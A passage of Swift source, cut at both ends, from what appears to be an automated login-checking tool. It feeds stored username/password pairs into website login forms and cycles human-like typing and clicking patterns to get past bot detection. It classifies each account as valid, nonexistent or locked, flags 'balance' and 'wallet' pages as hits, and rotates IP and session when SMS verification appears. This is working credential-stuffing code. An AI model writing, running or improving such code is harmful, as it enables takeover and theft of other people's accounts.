            if !appeared {
                let recoveryResult = await BlankPageRecoveryService.shared.attemptRecoveryForLoginSession(
                    session: session,
                    settings: automationSettings,
                    proxyTarget: proxyTarget,
                    sessionId: sessionId,
                    onLog: { [weak self] msg, level in
                        attempt.logs.append(PPSRLogEntry(message: msg, level: level))
                        self?.onLog?(msg, level)
                    }
                )

                if !recoveryResult.recovered {
                    await captureDebugScreenshot(session: session, attempt: attempt, step: "blank_page_load", note: "BLANK PAGE — recovery failed after \(recoveryResult.attemptsUsed) steps: \(recoveryResult.detail)", autoResult: .unknown)
                    attempt.status = .failed
                    attempt.errorMessage = "Blank page — recovery failed: \(recoveryResult.detail)"
                    attempt.completedAt = Date()
                    onBlankScreenshot?(session.targetURL.absoluteString)
                    onUnusualFailure?("Blank page for \(attempt.credential.username) — all recovery steps failed")
                    return .connectionFailure
                }
                attempt.logs.append(PPSRLogEntry(message: "BLANK PAGE RECOVERED via \(recoveryResult.stepUsed?.rawValue ?? "unknown"): \(recoveryResult.detail)", level: .success))
                logger.log("BLANK PAGE RECOVERED for \(attempt.credential.username) via \(recoveryResult.stepUsed?.rawValue ?? "unknown")", category: .automation, level: .success, sessionId: sessionId)
            }
        }

        logger.startTimer(key: "\(sessionId)_cookies")
        await session.dismissCookieNotices()
        let cookieMs = logger.stopTimer(key: "\(sessionId)_cookies")
        attempt.logs.append(PPSRLogEntry(message: "Cookie/consent notices dismissed", level: .info))
        logger.log("Cookie notices dismissed", category: .webView, level: .trace, sessionId: sessionId, durationMs: cookieMs)
        try? await Task.sleep(for: .milliseconds(300))

        let preLoginContent = await session.getPageContent()
        logger.log("Pre-login content captured (\(preLoginContent.count) chars)", category: .webView, level: .trace, sessionId: sessionId)

        logger.startTimer(key: "\(sessionId)_fieldverify")
        let verification = await session.verifyLoginFieldsExist()
        let fieldMs = logger.stopTimer(key: "\(sessionId)_fieldverify")
        logger.log("Field verification: \(verification.found)/2 found", category: .automation, level: verification.found >= 2 ? .debug : .warning, sessionId: sessionId, durationMs: fieldMs, metadata: ["missing": verification.missing.joined(separator: ",")])
        if verification.found < 2 {
            attempt.logs.append(PPSRLogEntry(message: "Field scan: \(verification.found)/2 found. Missing: [\(verification.missing.joined(separator: ", "))]", level: .warning))
            if verification.found == 0 {
                attempt.logs.append(PPSRLogEntry(message: "Waiting 4s for JavaScript-rendered content...", level: .info))
                logger.log("No fields found — waiting 4s for JS render", category: .webView, level: .debug, sessionId: sessionId)
                try? await Task.sleep(for: .seconds(4))
                let retryVerification = await session.verifyLoginFieldsExist()
                logger.log("Retry field verification: \(retryVerification.found)/2", category: .automation, level: retryVerification.found > 0 ? .info : .error, sessionId: sessionId)
                if retryVerification.found == 0 {
                    failAttempt(attempt, message: "FATAL: No login fields found after extended wait")
                    await captureDebugScreenshot(session: session, attempt: attempt, step: "no_fields", note: "No login fields found", autoResult: .fail)
                    return .connectionFailure
                }
            }
        } else {
            attempt.logs.append(PPSRLogEntry(message: "Both login fields verified present and enabled", level: .success))
        }

        let sessionAlive = await deadSessionDetector.isSessionAlive(session.webView, sessionId: sessionId)
        if !sessionAlive {
            attempt.logs.append(PPSRLogEntry(message: "DEAD SESSION: WebView hung — no JS response in 15s. Tearing down.", level: .error))
            logger.log("DEAD SESSION detected for \(attempt.credential.username) — tearing down", category: .webView, level: .critical, sessionId: sessionId)
            failAttempt(attempt, message: "Dead session — WebView hung, no JS response")
            onUnusualFailure?("Dead session for \(attempt.credential.username) — WebView hung")
            return .connectionFailure
        }

        let interactiveCheck = await checkInteractiveElementsExist(session: session, sessionId: sessionId)
        if !interactiveCheck.hasElements {
            attempt.logs.append(PPSRLogEntry(message: "NO INTERACTIVE ELEMENTS: page loaded but \(interactiveCheck.detail) — waiting for JS render", level: .warning))
            logger.log("No interactive elements for \(attempt.credential.username): \(interactiveCheck.detail)", category: .automation, level: .error, sessionId: sessionId)
            try? await Task.sleep(for: .seconds(3))
            let retryInteractive = await checkInteractiveElementsExist(session: session, sessionId: sessionId)
            if !retryInteractive.hasElements {
                failAttempt(attempt, message: "No interactive elements found after extended wait")
                await captureDebugScreenshot(session: session, attempt: attempt, step: "no_interactive", note: "Page loaded but no interactive elements", autoResult: .unknown)
                return .connectionFailure
            }
            attempt.logs.append(PPSRLogEntry(message: "Interactive elements appeared after wait: \(retryInteractive.detail)", level: .success))
        }

        let humanEngine = HumanInteractionEngine.shared
        let patternLearning = LoginPatternLearning.shared
        let calibrationService = LoginCalibrationService.shared
        let targetURLString = session.targetURL.absoluteString

        var calibration = calibrationService.calibrationFor(url: targetURLString)
        if calibration == nil || calibration?.isCalibrated != true {
            logger.log("No calibration — running auto-calibrate probe", category: .automation, level: .info, sessionId: sessionId)
            if let autoCal = await session.autoCalibrate() {
                calibrationService.saveCalibration(autoCal, forURL: targetURLString)
                calibration = autoCal
                attempt.logs.append(PPSRLogEntry(message: "Auto-calibrated: email=\(autoCal.emailField?.cssSelector ?? "nil") pass=\(autoCal.passwordField?.cssSelector ?? "nil") btn=\(autoCal.loginButton?.cssSelector ?? "nil")", level: .info))
                logger.log("Auto-calibration SUCCESS", category: .automation, level: .success, sessionId: sessionId)
            } else {
                attempt.logs.append(PPSRLogEntry(message: "Auto-calibration failed — trying Vision ML calibration", level: .warning))
                let visionCal = await visionCalibrateSession(session: session, forURL: targetURLString, sessionId: sessionId)
                if let visionCal {
                    calibrationService.saveCalibration(visionCal, forURL: targetURLString)
                    calibration = visionCal
                    attempt.logs.append(PPSRLogEntry(message: "Vision ML calibrated: confidence=\(String(format: "%.0f%%", visionCal.confidence * 100))", level: .success))
                } else {
                    attempt.logs.append(PPSRLogEntry(message: "Vision ML calibration also failed — using generic selectors", level: .warning))
                }
            }
        } else {
            attempt.logs.append(PPSRLogEntry(message: "Using saved calibration (confidence: \(String(format: "%.0f%%", (calibration?.confidence ?? 0) * 100)))", level: .info))
        }

        let maxSubmitCycles = max(3, automationSettings.maxSubmitCycles)
        var finalOutcome: LoginOutcome = .noAcc
        var lastEvaluation: EvaluationResult?
        var usedPatterns: [LoginFormPattern] = []
        var lastContentHash: Int = 0
        var duplicateContentCount: Int = 0
        var buttonFingerprint: SmartButtonRecoveryService.ButtonFingerprint?

        let priorityPatterns: [LoginFormPattern]
        if automationSettings.trueDetectionEnabled && automationSettings.trueDetectionPriority {
            priorityPatterns = [.trueDetection, .calibratedTyping, .calibratedDirect, .tabNavigation, .reactNativeSetter, .formSubmitDirect, .coordinateClick, .visionMLCoordinate, .clickFocusSequential, .execCommandInsert, .slowDeliberateTyper, .mobileTouchBurst]
        } else if calibration?.isCalibrated == true {
            priorityPatterns = [.calibratedTyping, .calibratedDirect, .trueDetection, .tabNavigation, .reactNativeSetter, .formSubmitDirect, .coordinateClick, .visionMLCoordinate, .clickFocusSequential, .execCommandInsert, .slowDeliberateTyper, .mobileTouchBurst]
        } else {
            priorityPatterns = [.trueDetection, .tabNavigation, .reactNativeSetter, .visionMLCoordinate, .formSubmitDirect, .clickFocusSequential, .execCommandInsert, .slowDeliberateTyper, .mobileTouchBurst, .calibratedDirect, .coordinateClick, .calibratedTyping]
        }

        for cycle in 1...maxSubmitCycles {
            logger.log("Phase: HUMAN PATTERN CYCLE \(cycle)/\(maxSubmitCycles)", category: .automation, level: .info, sessionId: sessionId)
            logger.startTimer(key: "\(sessionId)_cycle_\(cycle)")

            let selectedPattern: LoginFormPattern
            if cycle == 1 {
                let colourReadiness = await waitForPageReadyByColour(session: session, sessionId: sessionId)
                attempt.logs.append(PPSRLogEntry(message: "Colour readiness: settled=\(colourReadiness.settled) in \(colourReadiness.durationMs)ms — \(colourReadiness.detail)", level: colourReadiness.settled ? .success : .warning))

                let learnedBest = humanEngine.selectBestPattern(for: targetURLString)
                if automationSettings.trueDetectionEnabled && automationSettings.trueDetectionPriority {
                    selectedPattern = .trueDetection
                } else if learnedBest != .trueDetection {
                    selectedPattern = learnedBest
                    attempt.logs.append(PPSRLogEntry(message: "PatternML selected '\(learnedBest.rawValue)' as historically best for this site", level: .info))
                } else {
                    selectedPattern = .trueDetection
                }
            } else {
                let remaining = priorityPatterns.filter { !usedPatterns.contains($0) }
                selectedPattern = remaining.first ?? LoginFormPattern.allCases.filter { !usedPatterns.contains($0) }.randomElement() ?? LoginFormPattern.allCases.randomElement()!
            }
            usedPatterns.append(selectedPattern)

            advanceTo(.fillingCredentials, attempt: attempt, message: "Cycle \(cycle)/\(maxSubmitCycles) — using pattern: \(selectedPattern.rawValue)")
            attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): selected pattern '\(selectedPattern.rawValue)' — \(selectedPattern.description)", level: .info))

            if cycle > 1 {
                if let savedFingerprint = buttonFingerprint {
                    let recoveryResult = await session.waitForSmartButtonRecovery(originalFingerprint: savedFingerprint, host: pageHost, sessionId: sessionId)
                    if recoveryResult.recovered {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): button RECOVERED in \(recoveryResult.durationMs)ms — \(recoveryResult.reason)", level: .success))
                    } else {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): button recovery TIMEOUT after \(recoveryResult.durationMs)ms — \(recoveryResult.reason)", level: .warning))
                        let fallbackCheck = await session.checkLoginButtonReadiness()
                        if !fallbackCheck.isReady {
                            let buttonReadyTimeout = TimeoutResolver.resolveAutomationTimeout(15)
                            let waitResult = await session.waitForLoginButtonReady(timeout: buttonReadyTimeout)
                            if waitResult.timedOut {
                                attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): login button hung after smart+legacy check — requeuing", level: .warning))
                                attempt.status = .failed
                                attempt.errorMessage = "Login button hung in loading state — requeued"
                                attempt.completedAt = Date()
                                await captureDebugScreenshot(session: session, attempt: attempt, step: "button_hung", note: "Login button stuck in translucent/loading state", autoResult: .unknown)
                                return .unsure
                            }
                        }
                    }
                    if !recoveryResult.intermediateStates.isEmpty {
                        logger.log("ButtonRecovery cycle \(cycle): intermediate states: \(recoveryResult.intermediateStates.joined(separator: " → "))", category: .automation, level: .trace, sessionId: sessionId)
                    }
                } else {
                    let buttonCheck = await session.checkLoginButtonReadiness()
                    if !buttonCheck.isReady {
                        let buttonReadyTimeout = TimeoutResolver.resolveAutomationTimeout(15)
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): login button not ready (\(buttonCheck.detail)) — waiting up to \(Int(buttonReadyTimeout))s", level: .warning))
                        let waitResult = await session.waitForLoginButtonReady(timeout: buttonReadyTimeout)
                        if waitResult.timedOut {
                            attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): login button hung — requeuing", level: .warning))
                            attempt.status = .failed
                            attempt.errorMessage = "Login button hung in loading state — requeued"
                            attempt.completedAt = Date()
                            await captureDebugScreenshot(session: session, attempt: attempt, step: "button_hung", note: "Login button stuck in translucent/loading state", autoResult: .unknown)
                            return .unsure
                        }
                    }
                    try? await Task.sleep(for: .milliseconds(Int.random(in: 500...1500)))
                }
            }

            await session.dismissCookieNotices()
            try? await Task.sleep(for: .milliseconds(Int.random(in: 200...600)))

            logger.startTimer(key: "\(sessionId)_pattern_\(cycle)")
            let patternResult = await session.executeHumanPattern(
                selectedPattern,
                username: attempt.credential.username,
                password: attempt.credential.password,
                sessionId: sessionId
            )
            let patternMs = logger.stopTimer(key: "\(sessionId)_pattern_\(cycle)")

            attempt.logs.append(PPSRLogEntry(
                message: "Cycle \(cycle) pattern result: \(patternResult.summary)",
                level: patternResult.overallSuccess ? .success : .warning
            ))
            logger.log("Pattern '\(selectedPattern.rawValue)' result: \(patternResult.summary)", category: .automation, level: patternResult.overallSuccess ? .success : .warning, sessionId: sessionId, durationMs: patternMs)

            if !patternResult.usernameFilled || !patternResult.passwordFilled {
                let fieldValues = await session.getFieldValues()
                let alreadyHasEmail = fieldValues.email == attempt.credential.username
                let alreadyHasPass = fieldValues.password == attempt.credential.password

                if alreadyHasEmail && alreadyHasPass {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): pattern reported incomplete but fields already contain correct values — skipping re-fill", level: .info))
                } else {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): field fill failed — clearing fields then falling back to calibrated+legacy fill", level: .warning))
                    await session.clearAllInputFields()
                    try? await Task.sleep(for: .milliseconds(200))
                    if !alreadyHasEmail {
                        let calUserResult = await session.fillUsernameCalibrated(attempt.credential.username, calibration: calibration)
                        attempt.logs.append(PPSRLogEntry(message: "Calibrated email fill: \(calUserResult.detail)", level: calUserResult.success ? .info : .warning))
                        try? await Task.sleep(for: .milliseconds(300))
                    }
                    if !alreadyHasPass {
                        let calPassResult = await session.fillPasswordCalibrated(attempt.credential.password, calibration: calibration)
                        attempt.logs.append(PPSRLogEntry(message: "Calibrated password fill: \(calPassResult.detail)", level: calPassResult.success ? .info : .warning))
                        try? await Task.sleep(for: .milliseconds(400))
                    }
                }
            }

            advanceTo(.submitting, attempt: attempt, message: "Cycle \(cycle)/\(maxSubmitCycles) — evaluating submit...")

            buttonFingerprint = await session.captureButtonFingerprint(sessionId: sessionId)
            if let bf = buttonFingerprint {
                attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): captured button fingerprint — text='\(bf.textContent)' bg=\(bf.bgColor) opacity=\(String(format: "%.2f", bf.opacity))", level: .info))
            }

            if !patternResult.submitTriggered {
                attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): pattern submit failed — trying debug button → calibrated → legacy click strategies", level: .warning))
                var legacySubmitOK = false

                let debugBtnResult = await debugButtonService.replaySuccessfulMethod(session: session, url: targetURLString)
                if debugBtnResult.success {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) DEBUG BUTTON REPLAY: \(debugBtnResult.detail)", level: .success))
                    logger.log("DebugLoginButton replay SUCCESS for \(targetURLString)", category: .automation, level: .success, sessionId: sessionId)
                    legacySubmitOK = true
                } else if debugButtonService.hasSuccessfulMethod(for: targetURLString) {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) debug button replay failed: \(debugBtnResult.detail)", level: .warning))
                }

                if !legacySubmitOK {
                    let calClickResult = await session.clickLoginButtonCalibrated(calibration: calibration)
                    if calClickResult.success {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) calibrated click: \(calClickResult.detail)", level: .info))
                        legacySubmitOK = true
                    }
                }

                if !legacySubmitOK {
                    for submitAttempt in 1...4 {
                        let clickResult = await session.clickLoginButton()
                        if clickResult.success {
                            attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) legacy click attempt \(submitAttempt): \(clickResult.detail)", level: .info))
                            legacySubmitOK = true
                            break
                        }
                        if submitAttempt < 4 {
                            try? await Task.sleep(for: .seconds(Double(submitAttempt)))
                        }
                    }
                }
                if !legacySubmitOK {
                    let ocrResult = await session.ocrClickLoginButton()
                    if ocrResult.success {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) OCR click: \(ocrResult.detail)", level: .info))
                        legacySubmitOK = true
                    }
                }
                if !legacySubmitOK {
                    let visionResult = await visionClickLoginButton(session: session, sessionId: sessionId)
                    if visionResult {
                        attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) Vision ML click: found and clicked login button via screenshot OCR", level: .success))
                        legacySubmitOK = true
                    }
                }
                if !legacySubmitOK && cycle == 1 {
                    patternLearning.recordAttempt(url: targetURLString, pattern: selectedPattern, fillSuccess: patternResult.usernameFilled && patternResult.passwordFilled, submitSuccess: false, loginOutcome: "submit_failed", responseTimeMs: patternMs ?? 0, submitMethod: patternResult.submitMethod)
                    failAttempt(attempt, message: "LOGIN SUBMIT FAILED after pattern + legacy attempts")
                    await captureDebugScreenshot(session: session, attempt: attempt, step: "submit_failed", note: "All submit strategies failed", autoResult: .fail)
                    return .connectionFailure
                }
                if !legacySubmitOK {
                    patternLearning.recordAttempt(url: targetURLString, pattern: selectedPattern, fillSuccess: patternResult.usernameFilled && patternResult.passwordFilled, submitSuccess: false, loginOutcome: "submit_failed", responseTimeMs: patternMs ?? 0, submitMethod: patternResult.submitMethod)
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle) all submit methods failed — skipping to next cycle", level: .warning))
                    continue
                }
            }

            let preSubmitURL = await session.getCurrentURL()
            let responseTimeout = TimeoutResolver.resolveAutomationTimeout(automationSettings.waitForResponseSeconds)
            attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): waiting up to \(Int(responseTimeout))s for response...", level: .info))

            logger.startTimer(key: "\(sessionId)_poll_\(cycle)")
            let pollResult = await session.rapidWelcomePoll(timeout: responseTimeout, originalURL: preSubmitURL)
            let pollMs = logger.stopTimer(key: "\(sessionId)_poll_\(cycle)")
            logger.log("Rapid poll complete: welcome=\(pollResult.welcomeTextFound) redirect=\(pollResult.redirectedToHomepage) nav=\(pollResult.navigationDetected) banner=\(pollResult.errorBannerDetected) sms=\(pollResult.smsNotificationDetected)", category: .automation, level: .debug, sessionId: sessionId, durationMs: pollMs)

            advanceTo(.evaluatingResult, attempt: attempt, message: "Cycle \(cycle)/\(maxSubmitCycles) — evaluating response...")

            var pageContent = pollResult.finalPageContent
            if pageContent.isEmpty {
                pageContent = await session.getPageContent()
            }
            var currentURL = pollResult.finalURL
            if currentURL.isEmpty {
                currentURL = await session.getCurrentURL()
            }
            attempt.detectedURL = currentURL
            attempt.responseSnippet = String(pageContent.prefix(500))

            let contentHash = pageContent.hashValue
            if contentHash == lastContentHash && cycle > 1 {
                duplicateContentCount += 1
                attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): DUPLICATE CONTENT detected (\(duplicateContentCount)x same hash) — page may be stuck", level: .warning))
                logger.log("Duplicate content hash on cycle \(cycle) — stuck page likely", category: .evaluation, level: .warning, sessionId: sessionId)
                if duplicateContentCount >= 6 {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): 6+ duplicate pages — skipping re-evaluation, treating as stuck", level: .error))
                    failAttempt(attempt, message: "Page stuck — same content after \(duplicateContentCount) consecutive cycles")
                    await captureDebugScreenshot(session: session, attempt: attempt, step: "stuck_page", note: "Same content hash after \(duplicateContentCount) cycles", autoResult: .unknown)
                    return .connectionFailure
                }
            } else {
                duplicateContentCount = 0
            }
            lastContentHash = contentHash

            let screenshotImage: UIImage?
            if let ws = pollResult.welcomeScreenshot {
                screenshotImage = ws
            } else {
                screenshotImage = await session.captureScreenshot()
            }
            attempt.responseSnapshot = screenshotImage

            if let img = screenshotImage, BlankScreenshotDetector.isBlank(img) {
                attempt.logs.append(PPSRLogEntry(message: "BLANK SCREENSHOT on cycle \(cycle) — starting recovery...", level: .warning))
                logger.log("BLANK SCREENSHOT detected for \(attempt.credential.username) on cycle \(cycle)", category: .screenshot, level: .error, sessionId: sessionId)

                let postSubmitRecovery = await BlankPageRecoveryService.shared.attemptRecoveryForLoginSession(
                    session: session,
                    settings: automationSettings,
                    proxyTarget: proxyTarget,
                    sessionId: sessionId,
                    onLog: { [weak self] msg, level in
                        attempt.logs.append(PPSRLogEntry(message: msg, level: level))
                        self?.onLog?(msg, level)
                    }
                )

                if !postSubmitRecovery.recovered {
                    await captureDebugScreenshot(session: session, attempt: attempt, step: "blank_screenshot", note: "BLANK PAGE — recovery failed: \(postSubmitRecovery.detail)", autoResult: .unknown)
                    attempt.status = .failed
                    attempt.errorMessage = "Blank screenshot — recovery failed: \(postSubmitRecovery.detail)"
                    attempt.completedAt = Date()
                    onBlankScreenshot?(session.targetURL.absoluteString)
                    onUnusualFailure?("Blank screenshot for \(attempt.credential.username) — recovery failed")
                    return .connectionFailure
                }
                attempt.logs.append(PPSRLogEntry(message: "BLANK PAGE RECOVERED on cycle \(cycle) via \(postSubmitRecovery.stepUsed?.rawValue ?? "unknown")", level: .success))
            }

            let welcomeTextFound = pollResult.welcomeTextFound
            let welcomeContext = pollResult.welcomeContext

            attempt.logs.append(PPSRLogEntry(
                message: "Welcome! rapid poll: \(welcomeTextFound ? "FOUND — \(welcomeContext ?? "")" : "NOT FOUND")",
                level: welcomeTextFound ? .success : .info
            ))
            attempt.logs.append(PPSRLogEntry(
                message: "Redirect check: \(pollResult.redirectedToHomepage ? "REDIRECTED to homepage" : "still on login page") | URL: \(currentURL)",
                level: pollResult.redirectedToHomepage ? .success : .info
            ))

            if pollResult.errorBannerDetected {
                attempt.logs.append(PPSRLogEntry(
                    message: "RED BANNER ERROR detected: \(pollResult.errorBannerText ?? "error") — wiping session, requeuing to bottom",
                    level: .warning
                ))
                await captureTerminalScreenshot(session: session, attempt: attempt, step: "red_banner_error", note: "RED BANNER ERROR: \(pollResult.errorBannerText ?? "error") — requeued for future retry", autoResult: .unknown, terminalType: .errorBanner)
                attempt.status = .failed
                attempt.errorMessage = "Red banner error detected — requeuing to bottom"
                attempt.completedAt = Date()
                return .redBannerError
            }

            if pollResult.smsNotificationDetected {
                attempt.logs.append(PPSRLogEntry(
                    message: "SMS NOTIFICATION detected (Ignition): \(pollResult.smsNotificationText ?? "sms verification") — burning session, requeuing with different IP/webview",
                    level: .warning
                ))
                await captureTerminalScreenshot(session: session, attempt: attempt, step: "sms_notification", note: "SMS NOTIFICATION (Ignition): \(pollResult.smsNotificationText ?? "sms verification") — burn session, retry with different setup", autoResult: .unknown, terminalType: .smsVerification)
                attempt.status = .failed
                attempt.errorMessage = "SMS notification detected — burning session, requeuing for retry with different IP/webview"
                attempt.completedAt = Date()
                return .smsDetected
            }

            logger.startTimer(key: "\(sessionId)_eval_\(cycle)")
            let evaluation = evaluateLoginResponse(
                pageContent: pageContent,
                currentURL: currentURL,
                preLoginURL: preLoginURL,
                pageTitle: await session.getPageTitle(),
                welcomeTextFound: welcomeTextFound,
                redirectedToHomepage: pollResult.redirectedToHomepage,
                navigationDetected: pollResult.navigationDetected,
                contentChanged: pollResult.anyContentChange
            )
            let _ = logger.stopTimer(key: "\(sessionId)_eval_\(cycle)")
            lastEvaluation = evaluation
            let cycleMs = logger.stopTimer(key: "\(sessionId)_cycle_\(cycle)")
            logger.log("Cycle \(cycle) evaluation: \(evaluation.outcome) score=\(evaluation.score) signals=\(evaluation.signals.count) — \(evaluation.reason)", category: .evaluation, level: evaluation.outcome == .success ? .success : .info, sessionId: sessionId, durationMs: cycleMs, metadata: ["score": "\(evaluation.score)", "outcome": "\(evaluation.outcome)", "signalCount": "\(evaluation.signals.count)"])
            for signal in evaluation.signals {
                logger.log("  Signal: \(signal)", category: .evaluation, level: .trace, sessionId: sessionId)
            }

            let autoResult: PPSRDebugScreenshot.AutoDetectedResult
            switch evaluation.outcome {
            case .success: autoResult = .pass
            case .noAcc, .permDisabled, .tempDisabled: autoResult = .fail
            default: autoResult = .unknown
            }

            await captureAlwaysScreenshot(session: session, attempt: attempt, cycle: cycle, maxCycles: maxSubmitCycles, welcomeTextFound: welcomeTextFound, redirected: pollResult.redirectedToHomepage, evaluationReason: evaluation.reason, currentURL: currentURL, autoResult: autoResult)

            attempt.logs.append(PPSRLogEntry(
                message: "Cycle \(cycle) evaluation: \(evaluation.outcome) (score: \(evaluation.score), signals: \(evaluation.signals.count)) — \(evaluation.reason)",
                level: evaluation.outcome == .success ? .success : evaluation.outcome == .noAcc ? .warning : .error
            ))

            let outcomeStr: String
            switch evaluation.outcome {
            case .success: outcomeStr = "success"
            case .tempDisabled: outcomeStr = "tempDisabled"
            case .permDisabled: outcomeStr = "permDisabled"
            case .noAcc: outcomeStr = "noAcc"
            default: outcomeStr = "unsure"
            }
            patternLearning.recordAttempt(
                url: targetURLString,
                pattern: selectedPattern,
                fillSuccess: patternResult.usernameFilled && patternResult.passwordFilled,
                submitSuccess: patternResult.submitTriggered || true,
                loginOutcome: outcomeStr,
                responseTimeMs: cycleMs ?? 0,
                submitMethod: patternResult.submitMethod
            )

            switch evaluation.outcome {
            case .success:
                advanceTo(.completed, attempt: attempt, message: "LOGIN SUCCESS on cycle \(cycle) via pattern '\(selectedPattern.rawValue)' — \(evaluation.reason)")
                attempt.completedAt = Date()
                return .success

            case .tempDisabled:
                attempt.logs.append(PPSRLogEntry(message: "TEMP DISABLED on cycle \(cycle): \(evaluation.reason) — FINAL RESULT", level: .warning))
                failAttempt(attempt, message: "Account temporarily disabled: \(evaluation.reason)")
                await captureTerminalScreenshot(session: session, attempt: attempt, step: "temp_disabled", note: "TEMP DISABLED: \(evaluation.reason)", autoResult: .fail, terminalType: .temporarilyDisabled)
                return .tempDisabled

            case .permDisabled:
                attempt.logs.append(PPSRLogEntry(message: "PERM DISABLED on cycle \(cycle): \(evaluation.reason) — FINAL RESULT (immediate)", level: .error))
                failAttempt(attempt, message: "Account permanently disabled/blacklisted: \(evaluation.reason)")
                await captureTerminalScreenshot(session: session, attempt: attempt, step: "perm_disabled", note: "PERM DISABLED: \(evaluation.reason)", autoResult: .fail, terminalType: .accountDisabled)
                return .permDisabled

            case .noAcc:
                if cycle < maxSubmitCycles {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): no account — retrying (\(maxSubmitCycles - cycle) cycles left)", level: .warning))
                    finalOutcome = .noAcc
                    try? await Task.sleep(for: .seconds(Double(cycle) * 1.5))
                } else {
                    finalOutcome = .noAcc
                }

            default:
                if cycle < maxSubmitCycles {
                    attempt.logs.append(PPSRLogEntry(message: "Cycle \(cycle): no clear result — retrying (\(maxSubmitCycles - cycle) cycles left)", level: .warning))
                    try? await Task.sleep(for: .seconds(Double(cycle) * 1.5))
                }
                finalOutcome = .noAcc
            }
        }

        let eval = lastEvaluation
        switch finalOutcome {
        case .success:
            advanceTo(.completed, attempt: attempt, message: "LOGIN SUCCESS — \(eval?.reason ?? "confirmed")")
            attempt.completedAt = Date()
            return .success

        case .permDisabled:
            attempt.logs.append(PPSRLogEntry(message: "PERM DISABLED after \(maxSubmitCycles) cycles: \(eval?.reason ?? "unknown")", level: .error))
            failAttempt(attempt, message: "Account permanently disabled/blacklisted: \(eval?.reason ?? "unknown")")
            return .permDisabled

        case .tempDisabled:
            attempt.logs.append(PPSRLogEntry(message: "TEMP DISABLED after \(maxSubmitCycles) cycles: \(eval?.reason ?? "unknown")", level: .warning))
            failAttempt(attempt, message: "Account temporarily disabled: \(eval?.reason ?? "unknown")")
            return .tempDisabled

        case .noAcc:
            attempt.logs.append(PPSRLogEntry(message: "NO ACC after \(maxSubmitCycles) cycles: \(eval?.reason ?? "unknown")", level: .error))
            failAttempt(attempt, message: "No account found after \(maxSubmitCycles) attempts: \(eval?.reason ?? "unknown")")
            return .noAcc

        default:
            attempt.logs.append(PPSRLogEntry(message: "NO ACC after \(maxSubmitCycles) cycles (ambiguous fail assumed no account): \(eval?.reason ?? "unknown")", level: .error))
            failAttempt(attempt, message: "No account — ambiguous result defaulted to no acc after \(maxSubmitCycles) attempts")
            return .noAcc
        }
    }

    // MARK: - Weighted Multi-Signal Evaluation

    private struct EvaluationResult {
        let outcome: LoginOutcome
        let score: Int
        let reason: String
        let signals: [String]
    }

    private func evaluateLoginResponse(
        pageContent: String,
        currentURL: String,
        preLoginURL: String,
        pageTitle: String,
        welcomeTextFound: Bool,
        redirectedToHomepage: Bool,
        navigationDetected: Bool,
        contentChanged: Bool
    ) -> EvaluationResult {
        let contentLower = pageContent.lowercased()
        let urlLower = currentURL.lowercased()

        var successScore: Int = 0
        var incorrectScore: Int = 0
        var disabledScore: Int = 0
        var successSignals: [String] = []
        var incorrectSignals: [String] = []
        var disabledSignals: [String] = []

        // --- SUCCESS: TRUE DETECTION markers (balance, wallet, my account, logout) OR homepage redirect ---
        // CRITICAL: "welcome" is NOT a valid success indicator per TRUE DETECTION protocol

        let trueDetectionSuccessMarkers = ["balance", "wallet", "my account", "logout"]
        for marker in trueDetectionSuccessMarkers {
            if contentLower.contains(marker) {
                successScore += 100
                successSignals.append("+100 TRUE DETECTION marker '\(marker)' found")
                break
            }
        }

        if welcomeTextFound {
            successScore += 40
            successSignals.append("+40 'Welcome!' text (secondary indicator only)")
        }

        if redirectedToHomepage && !urlLower.contains("/login") && !urlLower.contains("/signin") {
            successScore += 80
            successSignals.append("+80 redirected away from login to homepage")
        }

        // --- INCORRECT signals (wrong credentials) ---

        let strongIncorrectTerms: [(String, Int)] = [
            ("incorrect password", 50), ("incorrect email", 50),
            ("invalid credentials", 50), ("wrong password", 50),
            ("invalid email or password", 55), ("incorrect username or password", 55),
            ("authentication failed", 45), ("login failed", 40),
            ("invalid login", 45), ("credentials are incorrect", 50),
            ("does not match", 40), ("not recognized", 40),
            ("no account found", 45), ("account not found", 45),
            ("email not found", 45), ("user not found", 45),
            ("please check your", 35), ("not valid", 30),
        ]
        for (term, weight) in strongIncorrectTerms {
            if contentLower.contains(term) {
                incorrectScore += weight
                incorrectSignals.append("+\(weight) '\(term)'")
            }
        }

        let weakIncorrectTerms: [(String, Int)] = [
            ("please try again", 20),
            ("invalid email", 20), ("invalid password", 20),
            ("check your credentials", 25), ("unable to log in", 25),
            ("login error", 20), ("sign in error", 20),
        ]
        for (term, weight) in weakIncorrectTerms {
            if contentLower.contains(term) {
                incorrectScore += weight
                incorrectSignals.append("+\(weight) '\(term)'")
            }
        }

        let loginContextTerms = ["password", "credential", "login", "sign in", "email", "username"]
        let hasLoginContext = loginContextTerms.contains { contentLower.contains($0) }
        if contentLower.contains("try again") && hasLoginContext {
            incorrectScore += 15
            incorrectSignals.append("+15 'try again' with login context")
        }

        if urlLower.contains("/login") || urlLower.contains("/signin") {
            if contentChanged && incorrectScore > 0 {
                incorrectScore += 10
                incorrectSignals.append("+10 still on login page with error content")
            }
            if !welcomeTextFound && !redirectedToHomepage {
                incorrectScore += 5
                incorrectSignals.append("+5 still on login URL without Welcome! or redirect")
            }
        }

        // --- DISABLED signals (blocked/banned) ---

        var temporarilyLocked = false
        let tempLockTerms = [
            "temporarily", "temporary lock", "temporarily locked",
